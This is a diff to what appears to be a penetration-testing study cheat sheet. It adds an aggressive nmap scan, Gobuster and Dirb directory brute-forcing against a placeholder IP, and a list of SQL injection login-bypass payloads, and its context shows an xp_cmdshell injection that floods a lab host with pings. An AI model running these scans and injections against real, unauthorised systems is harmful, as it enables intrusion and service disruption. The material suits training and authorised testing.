@@ -33,6 +33,7 @@ Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
 ```console
 Nmap -Pn -p 3389 target > rdp  // grep -B 5 open rdp
 Nmap -Pn -p 3306 target > mysql // grep -B 5 open mysql
+nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10
 ```
 
 * To scan the live Host
@@ -55,8 +56,22 @@ nmap -Pn -A x.x.x.1/24 -vv --open
 
 </details>
 
+# If have web service, try enumerate:
+<details>
+  <summary>Gobuster</summary>
+  
+```shell
+gobuster -e -u http://10.10.10.10 -w wordlsit.txt
+```
+</details>
 
-
+<details>
+  <summary>Dirb</summary>
+  
+```shell
+dirb http://10.10.10.10 wordlist.txt
+```
+</details>
 
 # Credential / Password Attacks
 <details>
@@ -239,6 +254,18 @@ Create database from login
 
 Execute cmd from login
 •	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+```
+
+Other SQLi
+```shell
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
 ```
 </details>
 
